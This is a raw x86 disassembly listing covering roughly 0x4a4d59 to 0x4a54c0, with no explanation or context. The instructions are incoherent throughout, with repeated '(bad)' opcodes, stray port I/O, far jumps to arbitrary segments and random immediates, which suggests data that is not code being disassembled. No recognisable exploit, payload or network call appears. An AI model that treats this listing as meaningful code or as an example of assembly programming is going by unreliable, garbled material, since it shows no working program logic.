  4a4d59:	es jl  0x4a4cfb
  4a4d5c:	lock and eax,0xbf5485a8
  4a4d62:	mov    WORD PTR [edi+0x5e133b5c],gs
  4a4d68:	sbb    eax,0xc8f073b5
  4a4d6d:	test   BYTE PTR [esi+ecx*2+0x75],ch
  4a4d71:	mov    DWORD PTR ds:0x5b5c911d,edx
  4a4d77:	mov    ah,0xd3
  4a4d79:	out    dx,al
  4a4d7a:	jmp    0xf32d12f
  4a4d7f:	push   ebp
  4a4d80:	(bad)  
  4a4d81:	mov    BYTE PTR [edx+ecx*2+0x6c],dh
  4a4d85:	in     al,0xe0
  4a4d87:	mov    ah,0xf3
  4a4d89:	add    ecx,eax
  4a4d8b:	mov    bl,BYTE PTR fs:[esi+eax*2+0x46]
  4a4d90:	ficom  DWORD PTR [edi]
  4a4d92:	adc    DWORD PTR [eax+0xc],0xda345c6c
  4a4d99:	pop    esp
  4a4d9a:	pop    eax
  4a4d9b:	inc    esi
  4a4d9c:	inc    esp
  4a4d9d:	and    DWORD PTR [esi+0xc082498],esi
  4a4da3:	jnp    0x4a4e16
  4a4da5:	mov    edx,0xaa27da7f
  4a4daa:	sar    BYTE PTR [esi],cl
  4a4dac:	pop    esi
  4a4dad:	sbb    DWORD PTR ds:0xe6ef30ff,0x8283ed2c
  4a4db7:	in     eax,dx
  4a4db8:	xor    ch,al
  4a4dba:	push   esp
  4a4dbb:	enter  0x12c3,0x8b
  4a4dbf:	adc    BYTE PTR [ebx],al
  4a4dc1:	out    dx,eax
  4a4dc2:	fldcw  WORD PTR [ebx]
  4a4dc4:	js     0x4a4df1
  4a4dc6:	ss mov ecx,0x221c8930
  4a4dcc:	cmp    ebx,DWORD PTR [ebx-0x59]
  4a4dcf:	bnd jo 0x4a4e1f
  4a4dd2:	sbb    al,0x57
  4a4dd4:	inc    esi
  4a4dd5:	fidivr DWORD PTR [eax+0x5c2b93b8]
  4a4ddb:	mov    cl,0x28
  4a4ddd:	(bad)
  4a4de0:	mov    al,0x71
  4a4de2:	stos   BYTE PTR es:[edi],al
  4a4de3:	push   edx
  4a4de4:	mov    esi,edx
  4a4de6:	mov    ecx,0x3643052e
  4a4deb:	shr    DWORD PTR [eax+edx*1-0xf],1
  4a4def:	mov    WORD PTR [ebp+0x4ba391cc],cs
  4a4df5:	fadd   DWORD PTR [edx+0xbbd813b]
  4a4dfb:	in     al,dx
  4a4dfc:	std    
  4a4dfd:	ret    0xc34a
  4a4e00:	jae    0x4a4e0b
  4a4e02:	sbb    al,0x1c
  4a4e04:	jmp    0x4a4e11
  4a4e06:	dec    ecx
  4a4e07:	test   DWORD PTR [ebp+0x1bdba11c],edi
  4a4e0d:	push   0x26
  4a4e0f:	pop    ecx
  4a4e10:	mov    esp,0x686aac14
  4a4e15:	or     BYTE PTR [ebx],dl
  4a4e17:	adc    DWORD PTR [esi-0x5bc657dd],ecx
  4a4e1d:	cmp    esp,DWORD PTR [ecx+ebp*4-0x37731c47]
  4a4e24:	dec    esi
  4a4e25:	mov    al,0xa0
  4a4e27:	push   ebx
  4a4e28:	js     0x4a4e1a
  4a4e2a:	imul   edx,DWORD PTR [edi],0x8bc21f9c
  4a4e30:	or     eax,0x8d03a024
  4a4e35:	add    DWORD PTR [ebx-0x77eecbfa],ebx
  4a4e3b:	rcr    BYTE PTR [eax+eiz*4-0x4f42f7b0],0xc4
  4a4e43:	rol    dl,1
  4a4e45:	push   ebx
  4a4e46:	add    eax,0x98e11518
  4a4e4b:	or     DWORD PTR [eax],ebx
  4a4e4d:	add    ecx,esp
  4a4e4f:	sub    edi,ebx
  4a4e51:	lods   eax,DWORD PTR ds:[esi]
  4a4e52:	xor    BYTE PTR [ebp-0x252e0385],ch
  4a4e58:	mov    ch,dh
  4a4e5a:	pop    es
  4a4e5b:	push   ss
  4a4e5c:	pop    ds
  4a4e5d:	cmp    BYTE PTR [esi-0x52],0x9
  4a4e61:	inc    ebp
  4a4e62:	popf   
  4a4e63:	sbb    ebx,esp
  4a4e65:	xchg   ecx,eax
  4a4e66:	or     esp,edx
  4a4e68:	cmp    DWORD PTR [ebp+0x29857c0b],0xf
  4a4e6f:	cmp    DWORD PTR [edx],esp
  4a4e71:	mov    dl,0xfe
  4a4e73:	or     al,0x83
  4a4e75:	clc    
  4a4e76:	cli    
  4a4e77:	add    BYTE PTR [esp+ebx*2+0x18182172],cl
  4a4e7e:	sbb    BYTE PTR [edi],ch
  4a4e80:	sahf   
  4a4e81:	ss xchg ecx,eax
  4a4e83:	cs push 0x9a91858
  4a4e89:	jle    0x4a4e6c
  4a4e8b:	pop    ebp
  4a4e8c:	ret    
  4a4e8d:	call   0x8118:0x338dd5db
  4a4e94:	adc    cl,dh
  4a4e96:	or     DWORD PTR [edi-0x24],ecx
  4a4e99:	sub    eax,esi
  4a4e9b:	mov    edx,DWORD PTR [ebp+0x260890fd]
  4a4ea1:	pusha  
  4a4ea2:	push   0xefc36327
  4a4ea7:	popa   
  4a4ea8:	xor    edx,edx
  4a4eaa:	xchg   ebp,eax
  4a4eab:	mov    ds:0xf8975d13,eax
  4a4eb0:	mov    edx,0x35df1457
  4a4eb5:	(bad)  
  4a4eb6:	mov    ah,0x1
  4a4eb8:	bound  ebp,QWORD PTR [edi+eiz*1]
  4a4ebb:	mov    al,0x57
  4a4ebd:	sbb    al,0x92
  4a4ebf:	adc    ebx,DWORD PTR [ebp-0x39]
  4a4ec2:	aam    0x1
  4a4ec4:	sbb    BYTE PTR [edx],dl
  4a4ec6:	sti    
  4a4ec7:	sbb    ch,BYTE PTR [ebx+ebp*1-0x3c]
  4a4ecb:	in     al,dx
  4a4ecc:	lea    eax,[eax+0xe]
  4a4ecf:	mov    ch,0xda
  4a4ed1:	push   es
  4a4ed2:	sub    eax,0x296a6838
  4a4ed7:	mov    al,0xdd
  4a4ed9:	mov    ch,0x23
  4a4edb:	bndstx [esi],(bad)
  4a4ede:	xchg   cx,ax
  4a4ee0:	bound  ebx,QWORD PTR [eax]
  4a4ee2:	ins    DWORD PTR es:[edi],dx
  4a4ee3:	mov    eax,ds:0x246eecef
  4a4ee8:	lea    esp,[esi+edi*8+0x16]
  4a4eec:	pusha  
  4a4eed:	or     al,0x61
  4a4eef:	mov    esp,0x41f33488
  4a4ef4:	cmp    BYTE PTR [edx+0x79],0x30
  4a4ef8:	mov    al,0xc
  4a4efa:	jbe    0x4a4e8c
  4a4efc:	retf   0x8077
  4a4eff:	and    al,0x77
  4a4f01:	bound  ecx,QWORD PTR [eax]
  4a4f03:	mov    esi,eax
  4a4f05:	ficomp DWORD PTR [edx]
  4a4f07:	push   es
  4a4f08:	test   esp,ebx
  4a4f0a:	push   DWORD PTR [ebp+0x83acbcf]
  4a4f10:	cmp    al,0x9d
  4a4f12:	dec    ecx
  4a4f13:	inc    esi
  4a4f14:	or     al,0x6e
  4a4f16:	mov    ds:0x9c847991,al
  4a4f1b:	sbb    al,0x2
  4a4f1d:	and    al,0x24
  4a4f1f:	lods   al,BYTE PTR ds:[esi]
  4a4f20:	dec    ebp
  4a4f21:	xor    eax,0x102990a
  4a4f26:	jl     0x4a4ea8
  4a4f28:	mov    al,ds:0x9494a652
  4a4f2d:	sti    
  4a4f2e:	or     DWORD PTR [eax-0x60],ebp
  4a4f31:	dec    esi
  4a4f32:	pop    esp
  4a4f33:	test   DWORD PTR [ecx+eax*4+0x2],ecx
  4a4f37:	inc    esp
  4a4f38:	or     BYTE PTR [esi-0x7f],bh
  4a4f3b:	pushf  
  4a4f3c:	inc    esp
  4a4f3d:	add    ch,BYTE PTR [eax-0x68]
  4a4f40:	dec    edi
  4a4f41:	add    edx,DWORD PTR [ebx+0x32990ab]
  4a4f47:	pop    esp
  4a4f48:	add    ch,BYTE PTR [ecx+0x2e]
  4a4f4b:	nop
  4a4f4c:	pop    esp
  4a4f4d:	or     BYTE PTR [eax+0x39],dl
  4a4f50:	mov    ecx,0x4804990a
  4a4f55:	dec    eax
  4a4f56:	push   ebx
  4a4f57:	jo     0x4a4f55
  4a4f59:	add    al,BYTE PTR [edi]
  4a4f5b:	push   0x5035194
  4a4f60:	in     eax,0x0
  4a4f62:	dec    ecx
  4a4f63:	and    al,0x98
  4a4f65:	sub    al,0x4
  4a4f68:	inc    ebx
  4a4f69:	cwde   
  4a4f6a:	call   DWORD PTR [eax-0x46c600ae]
  4a4f70:	or     bl,BYTE PTR [ecx+0x4c7c7c06]
  4a4f76:	inc    ecx
  4a4f77:	lock or BYTE PTR [eax+0x7fb54],cl
  4a4f7e:	stos   DWORD PTR es:[edi],eax
  4a4f7f:	pop    esp
  4a4f80:	test   DWORD PTR [eax+0x5321f7b0],esi
  4a4f86:	and    ch,cl
  4a4f88:	push   es
  4a4f89:	push   ebp
  4a4f8a:	or     BYTE PTR [ecx],bl
  4a4f8c:	inc    eax
  4a4f8d:	sub    dl,BYTE PTR [edi-0x80]
  4a4f90:	add    BYTE PTR [ecx],0xa
  4a4f93:	cdq    
  4a4f94:	sub    BYTE PTR [ecx+0x4109f756],0x8
  4a4f9b:	cmp    DWORD PTR [ecx+0x55fa6060],edi
  4a4fa1:	enter  0x4814,0x57
  4a4fa5:	or     dl,dl
  4a4fa7:	or     al,0xb0
  4a4fa9:	retf   0xb4b4
  4a4fac:	test   DWORD PTR [eax],0x32157258
  4a4fb2:	add    eax,0x72059c0b
  4a4fb7:	sub    BYTE PTR [edx+0x598ce39c],0x72
  4a4fbe:	jb     0x4a4fd5
  4a4fc0:	xor    cl,BYTE PTR [esp+ecx*2]
  4a4fc3:	dec    esp
  4a4fc4:	cdq    
  4a4fc5:	add    bh,cl
  4a4fc7:	add    eax,0x5a906806
  4a4fcc:	or     eax,0xab95200
  4a4fd1:	(bad)  
  4a4fd2:	les    esp,FWORD PTR [ecx]
  4a4fd4:	push   ebx
  4a4fd5:	and    ch,cl
  4a4fd7:	pop    es
  4a4fd8:	pop    ebx
  4a4fd9:	push   cs
  4a4fda:	push   ds
  4a4fdb:	and    DWORD PTR [edi],esp
  4a4fdd:	push   edi
  4a4fde:	push   eax
  4a4fdf:	push   eax
  4a4fe0:	nop
  4a4fe1:	pop    esp
  4a4fe2:	stos   DWORD PTR es:[edi],eax
  4a4fe3:	nop
  4a4fe4:	sub    DWORD PTR [eax],ebp
  4a4fe6:	test   DWORD PTR [edi],0x95200cd0
  4a4fec:	rol    al,0x3
  4a4fef:	push   ebx
  4a4ff0:	pop    esp
  4a4ff1:	test   DWORD PTR [ecx+eax*8-0xd],ecx
  4a4ff5:	adc    al,cl
  4a4ff7:	add    eax,0xc8a90272
  4a4ffc:	sbb    BYTE PTR [ebp+0x6e],bl
  4a4fff:	jb     0x4a5016
  4a5001:	xor    dl,BYTE PTR [ecx]
  4a5003:	ins    BYTE PTR es:[edi],dx
  4a5004:	cmovno esi,eax
  4a5007:	or     BYTE PTR [edx],0xdf
  4a500a:	sbb    al,0x5e
  4a500c:	add    ebx,DWORD PTR [ebx+0x124c855c]
  4a5012:	sbb    al,0xf
  4a5014:	xor    BYTE PTR [eax+eiz*1+0x5f20eb80],bl
  4a501b:	jmp    FWORD PTR [edx]
  4a501d:	push   edi
  4a501e:	and    DWORD PTR [ebx+0x13],edx
  4a5021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a5022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a5023:	adc    al,0xec
  4a5025:	add    al,0x1
  4a5027:	fbld   TBYTE PTR [eax+eiz*2]
  4a502a:	test   DWORD PTR [esi+0x14c855ca],0x90f3a8a8
  4a5034:	sub    eax,ebx
  4a5036:	or     DWORD PTR [eax],ebp
  4a5038:	popa   
  4a5039:	not    DWORD PTR ds:0xab42e982
  4a503f:	loope  0x4a5020
  4a5041:	test   DWORD PTR [ecx+eax*2+0x71],ecx
  4a5045:	xor    BYTE PTR [edx-0x15],ah
  4a5048:	push   ss
  4a5049:	js     0x4a4fcf
  4a504b:	pushf  
  4a504c:	pop    esp
  4a504d:	xor    al,0x34
  4a504f:	cmp    BYTE PTR [ebx+0x54],ah
  4a5052:	enter  0x4411,0xd7
  4a5056:	pop    ss
  4a5057:	add    DWORD PTR [ebx-0x38],0x407070c8
  4a505e:	fs dec esp
  4a5060:	test   DWORD PTR [ecx+eax*2],ebx
  4a5063:	out    0x18,eax
  4a5065:	mov    al,fs:0x648c843a
  4a506b:	dec    eax
  4a506c:	gs sti 
  4a506e:	dec    esi
  4a506f:	scas   al,BYTE PTR es:[edi]
  4a5070:	inc    edx
  4a5071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a5072:	sbb    DWORD PTR [esp+edx*2+0x8],edx
  4a5076:	push   es
  4a5077:	cmp    al,0x42
  4a5079:	push   esp
  4a507a:	out    dx,ax
  4a507c:	nop
  4a507d:	addr16 sub ah,ah
  4a5080:	sbb    cl,ah
  4a5082:	int3   
  4a5083:	inc    edx
  4a5084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a5085:	pusha  
  4a5086:	subps  xmm4,XMMWORD PTR [edi-0x9]
  4a508a:	sbb    ecx,DWORD PTR [esi+0x70]
  4a508d:	push   esp
  4a508e:	scas   al,BYTE PTR es:[edi]
  4a508f:	test   BYTE PTR [ebx+edi*8+0x72156894],al
  4a5096:	add    al,0x35
  4a5098:	ret    
  4a5099:	sbb    al,0xe0
  4a509b:	adc    BYTE PTR [edx],dh
  4a509d:	xor    ch,BYTE PTR [eax+0x68]
  4a50a0:	push   0x990ab56a
  4a50a5:	cmp    bl,0x1d
  4a50a8:	and    BYTE PTR [edi],ah
  4a50aa:	cmp    BYTE PTR [esi+0x6bfcefef],bl
  4a50b0:	daa    
  4a50b1:	push   edi
  4a50b2:	and    DWORD PTR [ebx+0x1e],edx
  4a50b5:	cmp    BYTE PTR [eax],bh
  4a50b7:	add    eax,0x4211e01
  4a50bc:	ins    DWORD PTR es:[edi],dx
  4a50bd:	mul    DWORD PTR [edx+esi*2-0x5fe0cdeb]
  4a50c4:	mov    al,ds:0x9b05743
  4a50c9:	in     al,0xf7
  4a50cb:	and    BYTE PTR [eax],cl
  4a50cd:	sbb    DWORD PTR [ecx+0x7474bf8a],ebx
  4a50d3:	test   DWORD PTR [ecx+eax*8+0x70],ecx
  4a50d7:	and    al,0x6f
  4a50d9:	jmp    DWORD PTR [ecx]
  4a50db:	js     0x4a5061
  4a50dd:	pushf  
  4a50de:	pop    esp
  4a50df:	and    BYTE PTR [eax],ah
  4a50e1:	fs jo  0x4a5138
  4a50e4:	enter  0x1411,0xff
  4a50e8:	and    cl,BYTE PTR [esi+0x28c8c843]
  4a50ee:	sub    BYTE PTR [ecx+esi*2+0x642ae503],ah
  4a50f5:	or     ah,BYTE PTR [ebx]
  4a50f7:	rcl    BYTE PTR [esp+ecx*1],1
  4a50fa:	daa    
  4a50fb:	pop    eax
  4a50fc:	shl    bh,1
  4a50fe:	in     al,0x72
  4a5100:	dec    eax
  4a5102:	leave  
  4a5103:	push   ebp
  4a5104:	enter  0x2c24,0x2c
  4a5108:	fs or  ah,ah
  4a510b:	pop    ss
  4a510c:	add    ebp,DWORD PTR [eax+0x28]
  4a510f:	je     0x4a5136
  4a5111:	or     esp,esp
  4a5113:	in     al,0x2a
  4a5115:	cmp    al,0x3c
  4a5117:	adc    eax,0x5f20532
  4a511c:	push   0x76267570
  4a5121:	and    BYTE PTR [ebx-0x42b2b8e],0xac
  4a5128:	jbe    0x4a5121
  4a512a:	ret    0x642a
  4a512d:	or     ah,BYTE PTR [edi]
  4a512f:	mov    al,ds:0x255f4c13
  4a5134:	div    eax
  4a5136:	ja     0x4a5184
  4a5138:	test   DWORD PTR [ecx+eax*2],ebx
  4a513b:	xlat   BYTE PTR ds:[ebx]
  4a513c:	sub    BYTE PTR [eax],dh
  4a513e:	and    BYTE PTR [eax],bh
  4a5140:	test   BYTE PTR [eax+esi*1+0x4d0378f8],cl
  4a5147:	scas   al,BYTE PTR es:[edi]
  4a5148:	inc    edx
  4a5149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a514a:	sub    DWORD PTR [eax+0x16],edi
  4a514d:	in     al,0x46
  4a514f:	ror    BYTE PTR [edi],0xef
  4a5152:	lods   al,BYTE PTR ds:[esi]
  4a5153:	mov    eax,ds:0x4084c100
  4a5158:	fwait
  4a5159:	mov    DWORD PTR [edx+eax*1+0x3e],ecx
  4a515d:	or     BYTE PTR [edi-0x1cb7aca],0xd3
  4a5164:	stc    
  4a5165:	cld    
  4a5166:	pop    ss
  4a5167:	mov    al,0xdc
  4a5169:	call   0x34fe:0x348503dc
  4a5170:	add    al,0x54
  4a5172:	push   ds
  4a5173:	jle    0x4a5164
  4a5175:	fsub   QWORD PTR [edx]
  4a5177:	cmp    edx,DWORD PTR [ebp+0x7f]
  4a517a:	xor    eax,0x29090bc
  4a517f:	mov    dl,0xb6
  4a5181:	jmp    0x4f6c6bc
  4a5186:	fsub   QWORD PTR [ebp-0x167fc721]
  4a518c:	mov    edx,DWORD PTR [esi-0x11]
  4a518f:	in     al,0xda
  4a5191:	jmp    0x4a5152
  4a5193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5194:	jmp    0xb50087
  4a5199:	push   edx
  4a519a:	jecxz  0x4a51ec
  4a519c:	and    al,0xdb
  4a519e:	or     ebx,ebp
  4a51a0:	popf   
  4a51a1:	shr    DWORD PTR [ecx],cl
  4a51a3:	sub    BYTE PTR [ebp+0x1003851c],dl
  4a51a9:	jmp    0x4a51cf
  4a51ab:	lahf   
  4a51ac:	xchg   edi,eax
  4a51ad:	adc    dl,BYTE PTR [edx+edx*1]
  4a51b0:	adc    BYTE PTR [edx],dl
  4a51b2:	jne    0x6d38fd78
  4a51b8:	and    BYTE PTR [ecx+0x116a8e26],dl
  4a51be:	push   ecx
  4a51bf:	add    BYTE PTR [edi-0x7f6171b2],ch
  4a51c5:	add    ch,al
  4a51c7:	imul   edx,DWORD PTR [edi-0x40],0xfea09882
  4a51ce:	lea    edx,[edx]
  4a51d0:	cwde   
  4a51d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a51d2:	and    eax,0x79f93610
  4a51d7:	popa   
  4a51d8:	imul   esp,esi,0xfe9067c9
  4a51de:	mov    dh,bh
  4a51e0:	cmp    dh,0x76
  4a51e3:	js     0x4a5176
  4a51e5:	xchg   ecx,eax
  4a51e6:	jbe    0x4a5221
  4a51e8:	lea    edx,[eax+0xc]
  4a51eb:	mov    BYTE PTR [eax+0x1e],bh
  4a51ee:	xchg   esp,eax
  4a51ef:	rcl    BYTE PTR [ecx+0x79fe4838],0x28
  4a51f6:	(bad)  
  4a51f7:	out    0x69,eax
  4a51f9:	add    al,0x56
  4a51fb:	cdq    
  4a51fc:	pop    esi
  4a51fd:	pop    esi
  4a51fe:	mov    BYTE PTR [eax-0x66cfb64f],cl
  4a5204:	pop    esi
  4a5205:	je     0x4a5202
  4a5207:	popa   
  4a5208:	enter  0x57b1,0xd3
  4a520c:	push   0x68
  4a520e:	sub    DWORD PTR [eax],ecx
  4a5210:	retf   
  4a5211:	shl    DWORD PTR [ebp-0x2fd19020],0xc8
  4a5218:	test   BYTE PTR [eax],cl
  4a521a:	dec    esp
  4a521b:	xor    BYTE PTR [ecx],bh
  4a521d:	xor    al,0x99
  4a5220:	call   0x306a53e6
  4a5225:	push   ss
  4a5226:	xchg   esi,eax
  4a5227:	fldenv [ebp+0x421e7838]
  4a522d:	lds    esp,FWORD PTR [ecx+0x4b]
  4a5230:	jo     0x4a523a
  4a5232:	pushf  
  4a5233:	and    ebx,DWORD PTR [ecx+0x4d869df8]
  4a5239:	shl    DWORD PTR ds:0x33d8bf6d,0x80
  4a5240:	fidiv  DWORD PTR [ecx]
  4a5242:	sbb    al,0xd2
  4a5244:	shl    BYTE PTR [eax+0x68],1
  4a5247:	sbb    ecx,eax
  4a5249:	dec    ebp
  4a524a:	mov    bl,0xbf
  4a524c:	inc    ecx
  4a524d:	ficomp DWORD PTR [edx-0x48]
  4a5250:	out    0xb,al
  4a5252:	in     al,dx
  4a5253:	mov    bl,al
  4a5255:	int    0x68
  4a5257:	xchg   cl,cl
  4a5259:	and    BYTE PTR [ebx],ah
  4a525b:	test   al,0xce
  4a525d:	(bad)  
  4a525e:	pop    ebx
  4a525f:	mov    al,ch
  4a5261:	(bad)  
  4a5262:	mov    WORD PTR [ebx],?
  4a5264:	mov    BYTE PTR [eax],bl
  4a5266:	jne    0x4a520f
  4a5268:	pop    eax
  4a5269:	jo     0x4a52c6
  4a526b:	jnp    0x4a527a
  4a526d:	shr    ebp,1
  4a526f:	call   0x16e65bf1
  4a5274:	xchg   DWORD PTR [ebp-0x2d],edi
  4a5277:	xchg   BYTE PTR [eax+0x116c504c],dh
  4a527d:	xchg   edi,eax
  4a527e:	fisubr WORD PTR [ebx]
  4a5280:	aam    0xc
  4a5282:	dec    esp
  4a5283:	gs and eax,0x62fe2806
  4a5289:	or     al,0xb9
  4a528b:	add    cl,BYTE PTR [esi+0x16]
  4a528e:	cmp    BYTE PTR [edi+edi*8],dl
  4a5291:	loopne 0x4a530b
  4a5293:	adc    al,0x5d
  4a5295:	cmp    ecx,ebp
  4a5297:	aaa    
  4a5298:	imul   edi,eax,0x1fe4960
  4a529e:	jno    0x4a527e
  4a52a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a52a1:	inc    esp
  4a52a2:	inc    eax
  4a52a3:	cmp    BYTE PTR [eax-0x74],bl
  4a52a6:	xchg   edx,eax
  4a52a7:	add    ebp,DWORD PTR [ecx+0x22]
  4a52aa:	enter  0x108c,0x10
  4a52ae:	jae    0x4a5296
  4a52b0:	ficomp DWORD PTR [ecx]
  4a52b2:	pop    esp
  4a52b3:	dec    ecx
  4a52b4:	dec    BYTE PTR [ebp+0x2b]
  4a52b7:	add    bh,BYTE PTR [edi+0x580a9a5b]
  4a52bd:	shl    BYTE PTR [edi+eax*1+0x37],1
  4a52c1:	pop    esp
  4a52c2:	pop    eax
  4a52c3:	pusha  
  4a52c4:	int    0x3f
  4a52c6:	(bad)  
  4a52c7:	repnz fwait
  4a52c9:	push   0xf565aac4
  4a52ce:	jg     0x4a52d7
  4a52d0:	xor    al,ch
  4a52d2:	adc    BYTE PTR [edi-0x58],ch
  4a52d5:	enter  0xc31,0x24
  4a52d9:	and    ebx,eax
  4a52db:	ret    
  4a52dc:	arpl   WORD PTR [ecx],cx
  4a52de:	lods   al,BYTE PTR ds:[esi]
  4a52df:	dec    edx
  4a52e0:	and    BYTE PTR [ebx+0x20],bh
  4a52e3:	and    eax,0xbb3df4f0
  4a52e8:	jnp    0x4a5362
  4a52ea:	add    al,0xb6
  4a52ec:	inc    edi
  4a52ed:	popf   
  4a52ee:	sbb    ebx,edi
  4a52f0:	xor    al,0x10
  4a52f2:	mov    ds:0x8548d12,eax
  4a52f7:	enter  0xa544,0xb0
  4a52fb:	push   ebp
  4a52fc:	xor    BYTE PTR [eax+0x2],al
  4a52ff:	fisttp DWORD PTR [ebp+0x28]
  4a5302:	inc    esp
  4a5303:	(bad)  
  4a5305:	push   eax
  4a5306:	mov    eax,0xe7e0b764
  4a530b:	lock add al,0x10
  4a530e:	push   es
  4a530f:	adc    ch,BYTE PTR [edx]
  4a5311:	mov    esi,0xf890a216
  4a5316:	sub    al,0x27
  4a5319:	mov    eax,ds:0xe877aedb
  4a531e:	pop    esp
  4a531f:	aam    0x50
  4a5321:	push   ebx
  4a5322:	or     al,BYTE PTR [esi+0xf96d34b]
  4a5328:	nop
  4a5329:	xor    eax,0xd0d4329c
  4a532e:	xor    eax,0x22bafb9c
  4a5333:	dec    ebp
  4a5334:	push   0xffffff9d
  4a5336:	add    al,0x27
  4a5338:	bound  esi,QWORD PTR [ebx+0x35]
  4a533b:	sbb    BYTE PTR [eax],cl
  4a533d:	test   BYTE PTR [ebp+0x5b012981],dh
  4a5343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a5344:	pop    ecx
  4a5345:	clc    
  4a5346:	pop    esp
  4a5347:	push   0xd4eb79c8
  4a534c:	sub    DWORD PTR [eax],edi
  4a534e:	mov    eax,0x8490dd7c
  4a5353:	inc    esp
  4a5354:	adc    BYTE PTR [edx+0x50],cl
  4a5357:	je     0x4a52f8
  4a5359:	rol    BYTE PTR [eax+0x1cddd047],cl
  4a535f:	arpl   sp,cx
  4a5361:	test   DWORD PTR [esi*4+0x9f53eb0],esi
  4a5368:	in     eax,dx
  4a5369:	mov    al,ds:0x4589e2ab
  4a536e:	rcl    BYTE PTR [edx+eiz*2],0xc0
  4a5372:	jl     0x4a5308
  4a5374:	or     dl,BYTE PTR [esi-0x35]
  4a5377:	pop    ds
  4a5378:	fwait
  4a5379:	fwait
  4a537a:	mov    eax,esi
  4a537c:	xor    DWORD PTR [ebx+ebx*1-0x2f971ff5],0xffffffe1
  4a5384:	(bad)  
  4a5385:	pop    ecx
  4a5386:	push   0x6d34202e
  4a538b:	jmp    0x7453817e
  4a5390:	sub    bh,al
  4a5392:	shr    BYTE PTR [eax+edx*8+0x1e0534bc],1
  4a5399:	inc    ebx
  4a539a:	into   
  4a539b:	mov    dh,0x9e
  4a539d:	mov    eax,0xb9ddd8bc
  4a53a2:	adc    al,0x61
  4a53a4:	jg     0x4a5334
  4a53a6:	call   DWORD PTR [esi]
  4a53a8:	mov    edx,eax
  4a53aa:	jmp    0xa7cf0dfa
  4a53af:	push   0x2958acba
  4a53b4:	loop   0x4a539a
  4a53b6:	fcom   DWORD PTR [ecx+0x5d50cce0]
  4a53bc:	add    edx,DWORD PTR [eax]
  4a53be:	and    BYTE PTR [edi-0x3e],bl
  4a53c1:	push   es
  4a53c2:	icebp  
  4a53c3:	inc    eax
  4a53c4:	loopne 0x4a5402
  4a53c6:	adc    edi,DWORD PTR [ebx+0x71]
  4a53c9:	ret    
  4a53ca:	jecxz  0x4a5398
  4a53cc:	add    DWORD PTR [esi+0x10049200],ebx
  4a53d2:	xchg   esp,eax
  4a53d3:	add    DWORD PTR [eax+ecx*1],0x5090202
  4a53da:	push   eax
  4a53db:	test   al,0x16
  4a53dd:	or     ah,BYTE PTR [eax-0x5c6c01f1]
  4a53e3:	add    ch,BYTE PTR [ebp+0x1]
  4a53e6:	pop    edi
  4a53e7:	inc    ebx
  4a53e8:	dec    ecx
  4a53e9:	arpl   WORD PTR [edi+0x73],bp
  4a53ec:	mov    ah,0x89
  4a53ee:	sti    
  4a53ef:	jg     0x4a5452
  4a53f1:	fs push 0x5f
  4a53f4:	data16 jo 0x4a546b
  4a53f7:	popa   
  4a53f8:	outs   dx,BYTE PTR ds:[esi]
  4a53f9:	push   ss
  4a53fa:	jmp    0xd501:0x396b89a2
  4a5401:	fstp   TBYTE PTR [edx-0x2fe9cdf]
  4a5407:	pop    edi
  4a5408:	sbb    eax,0x41e4b192
  4a540d:	jb     0x4a5488
  4a540f:	jge    0x4a541d
  4a5411:	mov    WORD PTR [ecx+esi*1+0x1a01f701],ss
  4a5418:	inc    ebx
  4a5419:	and    DWORD PTR [ebx+esi*2+0x1],0x5420bfe
  4a5421:	mov    edi,0x76696409
  4a5426:	pop    edi
  4a5427:	ins    DWORD PTR es:[edi],dx
  4a5428:	ss xor al,0xdb
  4a542b:	imul   ebx,ebx,0x6d562708
  4a5431:	xor    DWORD PTR [ebp+0x13656143],ebp
  4a5437:	xlat   BYTE PTR ds:[ebx]
  4a5438:	dec    ecx
  4a5439:	adc    ebp,DWORD PTR [ebp+0x1]
  4a543c:	cmp    BYTE PTR [eax-0x6210b32b],dh
  4a5442:	xor    esi,DWORD PTR [edx]
  4a5444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a5445:	push   0x589129bc
  4a544a:	aaa    
  4a544b:	jmp    0x175dbe15
  4a5450:	add    DWORD PTR [ebp-0x4b],eax
  4a5453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5454:	jbe    0x4a544c
  4a5456:	call   DWORD PTR [ecx+0x2]
  4a5459:	daa    
  4a545a:	dec    edi
  4a545b:	outs   dx,BYTE PTR ds:[esi]
  4a545c:	lahf   
  4a545d:	xor    DWORD PTR [esi],esi
  4a545f:	imul   ebx,DWORD PTR [edi],0xded2632c
  4a5465:	jb     0x4a5488
  4a5467:	bound  edx,QWORD PTR [esi-0x13]
  4a546a:	xrstors [ecx+ebp*2+0x73cb3815]
  4a5472:	imul   ebp,DWORD PTR [esi+0x40],0xf6b7ff77
  4a5479:	in     eax,dx
  4a547a:	add    bh,bh
  4a547c:	js     0x4a54c5
  4a547e:	inc    ebx
  4a547f:	push   0x346bf26b
  4a5484:	inc    ebp
  4a5485:	push   esi
  4a5486:	inc    ebp
  4a5487:	dec    esi
  4a5488:	push   esp
  4a5489:	pop    edi
  4a548a:	push   ebx
  4a548b:	dec    ecx
  4a548c:	dec    esi
  4a548d:	dec    ebx
  4a548e:	pop    edi
  4a548f:	mov    cl,0xdd
  4a5491:	sub    DWORD PTR [eax],edx
  4a5493:	sub    al,0x52
  4a5495:	gs data16 jno 0x4a5502
  4a5499:	pop    esp
  4a549a:	frstor [ecx+edi*2+0x52cf3f01]
  4a54a1:	test   ebp,ebp
  4a54a3:	jecxz  0x4a54ee
  4a54a5:	xor    cl,BYTE PTR [ecx+0x44]
  4a54a8:	ins    BYTE PTR es:[edi],dx
  4a54a9:	ins    BYTE PTR es:[edi],dx
  4a54aa:	loope  0x4a5510
  4a54ac:	mov    BYTE PTR [eax-0x2d56a5ba],dh
  4a54b2:	fadd   DWORD PTR [esi-0x53c8c770]
  4a54b8:	sbb    BYTE PTR [esi+0x619b8d47],al
  4a54be:	lds    ebx,FWORD PTR [ecx]
  4a54c0:	push   ebx
